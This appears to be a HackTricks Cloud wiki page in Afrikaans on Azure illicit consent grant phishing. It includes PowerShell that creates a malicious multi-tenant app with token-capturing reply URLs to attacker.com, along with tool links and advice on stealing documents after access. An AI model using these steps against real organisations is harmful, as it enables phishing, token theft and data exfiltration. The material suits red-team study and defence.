# Az - Onwettige Toestemming Verlening

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## OAuth App Phishing

**Azure-toepassings** vra vir toestemming om toegang tot die **gebruikersdata** (basiese inligting, maar ook toegang tot dokumente, stuur e-posse...) te verkry.\
As dit **toegelaat** word, kan 'n normale gebruiker slegs toestemming verleen vir **"Lae Impak" toestemmings**. In **alle ander** gevalle is **administratiewe toestemming vereis**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` en 'n aangepaste rol wat `toestemming om toestemming aan toepassings te verleen` insluit, kan toestemming vir die hele huurder voorsien.

Slegs toestemmings wat **nie administratiewe toestemming vereis nie**, word geklassifiseer as **lae impak**. Dit is toestemmings wat vereis word vir **basiese aanmelding, soos openid, profiel, e-pos, User.Read en offline\_access**. As 'n **organisasie** toestemming vir **alle toepassings toelaat**, kan 'n werknemer toestemming verleen vir 'n toepassing om **die bogenoemde uit hul profiel te lees**.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Daarom kan 'n aanvaller 'n **skadelike toepassing** voorberei en met 'n **phishing** die gebruiker **die toepassing laat aanvaar en sy data steel**.

### Kontroleer of gebruikers toestemming mag verleen

Die volgende PowerShell-opdrag word gebruik om die toestemmingskonfigurasie vir gebruikers in Azure Active Directory (Azure AD) te kontroleer met betrekking tot hul vermo√´ om toestemming te verleen vir toepassings:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Deaktiveer gebruikersgoedkeuring**: Hierdie instelling verbied gebruikers om toestemmings aan aansoeke te verleen. Geen gebruikersgoedkeuring vir aansoeke word toegelaat nie.
* **Gebruikers kan toestemming verleen vir aansoeke van geverifieerde uitgewers of jou organisasie, maar slegs vir geselekteerde toestemmings**: Hierdie instelling stel alle gebruikers in staat om slegs toestemming te verleen vir aansoeke wat deur 'n geverifieerde uitgewer gepubliseer is en aansoeke wat in jou eie huurder geregistreer is. Dit voeg 'n laag van beheer by deur slegs toestemming toe te laat vir spesifieke toestemmings.
* **Gebruikers kan toestemming verleen vir alle aansoeke**: Hierdie instelling is meer inskiklik en stel alle gebruikers in staat om toestemming te verleen vir enige toestemmings vir aansoeke, solank daardie toestemmings nie administratiewe toestemming vereis nie.
* **Aangepaste aansoekgoedkeuringsbeleid**: Hierdie instelling dui aan dat 'n aangepaste beleid van krag is, wat aangepas kan word aan spesifieke organisatoriese vereistes en moontlik 'n kombinasie van beperkings gebaseer op die aansoekuitgewer, die toestemmings wat die aansoek versoek, en ander faktore.

## **Begrip van Illegitieme Toestemmingsverleningsaanval**

In 'n illegitieme toestemmingsverleningsaanval, mislei aanvallers eindgebruikers om toestemming te verleen aan 'n kwaadwillige aansoek wat by Azure geregistreer is. Dit word gedoen deur die aansoek te laat voorkom as legitiem, wat slagoffers onbewustelik laat kliek op 'n "Aanvaar" knoppie. As gevolg hiervan reik Azure AD 'n token uit aan die aanvaller se webwerf, wat hulle in staat stel om toegang te verkry tot en die slagoffer se data te manipuleer, soos die lees of stuur van e-posse en toegang tot l√™ers, sonder om 'n organisatoriese rekening te benodig.

## **Oorsig van die Aanvalsproses**

Die aanval behels verskeie stappe wat 'n generiese maatskappy teiken. Hier is hoe dit kan ontvou:

1. **Domeinregistrasie en Aansoekhuisvesing**: Die aanvaller registreer 'n domein wat lyk na 'n betroubare webwerf, byvoorbeeld "veiligedomeinlogin.com". Onder hierdie domein word 'n subdomein geskep (bv. "maatskappyname.veiligedomeinlogin.com") om 'n aansoek te huisves wat ontwerp is om magtigingskodes vas te vang en toegangstokens aan te vra.

2. **Aansoekregistrasie in Azure AD**: Die aanvaller registreer dan 'n Meertalige Aansoek in hul Azure AD-huurder, en noem dit na die teikenmaatskappy om legitiem te lyk. Hulle stel die aansoek se Omleidings-URL in om na die subdomein te verwys wat die kwaadwillige aansoek huisves.

3. **Opstel van Toestemmings**: Die aanvaller stel die aansoek op met verskeie API-toestemmings (bv. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Hierdie toestemmings, sodra dit deur die gebruiker verleen word, stel die aanvaller in staat om sensitiewe inligting namens die gebruiker te onttrek.

4. **Verspreiding van Kwaadwillige Skakels**: Die aanvaller skep 'n skakel wat die kli√´nt-ID van die kwaadwillige aansoek bevat en deel dit met teikengebruikers, deur hulle te mislei om toestemming te verleen.

## **Gebruik van Gereedskap vir die Aanval**

Die aanval kan gefasiliteer word met behulp van gereedskap soos [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Voorbereiding voor die Aanval:
As die aanvaller 'n mate van toegang tot 'n gebruiker in die slagoffer-organisasie het, kan hulle nagaan of die organisasie se beleid die gebruiker toelaat om aansoeke te aanvaar:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Om die aanval uit te voer, sal die aanvaller 'n **nuwe App in hul Azure Tenant** moet skep (in App-registrasies), wat gekonfigureer is met die volgende toestemmings:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` is binne `Microsoft Graph` in `Delegated permissions`. (Toepassingsregte sal altyd ekstra goedkeuring benodig).

* `User.ReadBasic.All` is die toestemming wat jou sal toelaat om **inligting van alle gebruikers** in die organisasie te lees as dit toegestaan word.
* Onthou dat slegs `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` en 'n aangepaste rol wat `toestemming om toestemmings aan toepassings te verleen` insluit, huurderbre√´ toestemming kan gee. Jy moet dus 'n gebruiker met een van daardie rolle **phish** as jy wil h√™ hy moet 'n **App wat admin-toestemming vereis** goedkeur.

Jy kan ook 'n App skep via die opdraggewer met:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Kyk na [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) om te leer hoe om dit te konfigureer.

{% hint style="warning" %}
Let daarop dat die verkrygde **toegangsteken** vir die **grafiek-eindpunt** sal wees met die scopes: `User.Read` en `User.ReadBasic.All` (die versoekte toestemmings). Jy sal nie in staat wees om ander aksies uit te voer nie (maar dit is genoeg om **inligting oor alle gebruikers** in die organisasie af te laai).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Jy kan ook hierdie instrument gebruik om hierdie aanval uit te voer.

## Post-Exploitation

Sodra jy toegang tot die gebruiker het, kan jy dinge doen soos die steel van sensitiewe dokumente en selfs die oplaai van dokumentl√™ers met agterdeure.

## Verwysings

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
